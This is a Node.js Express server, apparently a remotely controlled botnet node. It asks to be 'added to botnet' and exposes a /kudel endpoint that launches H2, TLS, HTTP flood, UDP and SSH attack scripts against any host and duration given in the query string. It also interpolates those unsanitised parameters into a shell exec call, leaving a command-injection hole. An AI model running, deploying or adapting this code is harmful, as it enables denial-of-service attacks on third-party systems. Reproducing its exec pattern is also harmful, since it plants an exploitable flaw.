const express = require('express');
const { exec } = require('child_process');
const url = require('url');
const cors = require('cors');
const path = require('path');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const indexPath = path.join(__dirname, 'index.html');

// Fungsi untuk mencatat akses ke konsol
const logAccess = (req, res, next) => {
    const timestamp = new Date().toISOString();
    console.log(`${timestamp} - Access to ${req.originalUrl} from ${req.ip}`);
    next(); // Penting untuk memanggil next() agar permintaan dilanjutkan
};

// Middleware untuk mencatat setiap akses
app.use(logAccess);

async function fetchData() {
    try {
        const response = await fetch('https://httpbin.org/get');
        const data = await response.json();
        console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
        return data;
    } catch (error) {
        console.error('Error fetching data:', error);
        return null;
    }
}

app.get('/', (req, res) => {
    res.sendFile(indexPath, (err) => {
        if (err) {
            console.error('Error sending file:', err);
            res.status(500).send('Internal Server Error');
        } else {
            console.log('Sent index.html');
        }
    });
});

app.get('/kudel', (req, res) => {
    const { host, port: targetPort, time, methods } = req.query;

    if (!host || !targetPort || !time || !methods) {
        console.log('Missing parameters:', req.query); // Log parameter yang hilang
        return res.status(400).json({
            error: 'Missing required parameters (host, port, time, methods)'
        });
    }

    console.log(`Received attack request: Method ${methods}, Target ${host}, Duration ${time}s`);

    const attackMethods = {
        'H2': `./lib/cache/h2.js ${host} ${time} 45 12 proxy.txt`,
        'TLS': `./lib/cache/tls.js ${host} ${time} 32 8 proxy.txt`,
        'FLOOD': `./lib/cache/flood.js ${host} ${time} 56 12 proxy.txt`,
        'MIX': `./lib/cache/mix.js ${host} ${time} 12 45 proxy.txt -v 3`,
        'SKIBIDI': `./lib/cache/skibidi.js ${host} ${time}`,
        'UDP': `./lib/cache/udp.js ${host} ${targetPort} ${time}`,
        'SSH': `./lib/cache/ssh.js ${host} ${targetPort} root ${time}`
    };

    const selectedMethod = attackMethods[methods];

    if (selectedMethod) {
        res.status(200).json({
            message: 'API request received. Executing script shortly.',
            target: host,
            time,
            methods
        });

        console.log(`Executing: node ${selectedMethod}`); // Log perintah yang akan dijalankan

        exec(`node ${selectedMethod}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Execution error: ${error}`);
                console.error(`stderr: ${stderr}`);
                return;
            }
            console.log(`Executed: node ${selectedMethod}`);
            console.log(`stdout: ${stdout}`);
        });
    } else {
        console.log(`Unsupported method: ${methods}`);
        return res.status(400).json({ error: `Unsupported method: ${methods}` });
    }
});

app.listen(port, () => {
    fetchData()
    console.log(`Server listening on port ${port}`);
});
